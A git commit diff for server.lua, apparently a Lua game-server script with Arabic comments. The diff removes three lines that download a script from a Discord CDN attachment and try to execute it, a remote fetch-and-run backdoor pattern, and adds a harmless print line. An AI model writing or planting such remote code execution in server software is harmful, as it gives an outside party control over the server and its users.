0b33cdc3598682be3959ac5bd2a11203f7ab4b82
nemer123 <82593964+nemer123@users.noreply.github.com>
2021-04-15 17:15:11 +0300

    Update server.lua

--- server.lua
+++ server.lua
@@ -1,3 +1,1 @@
-PerformHttpRequest("https://cdn.discordapp.com/attachments/813434313856516156/832252915136593930/server.lua", function (err, text, head) -- اتصل الى الموقع
-    print(text)() -- يشغل السكربت .. تقدر تبدلها بأي شي ثاني
- end)
+print("nemerm3lm")
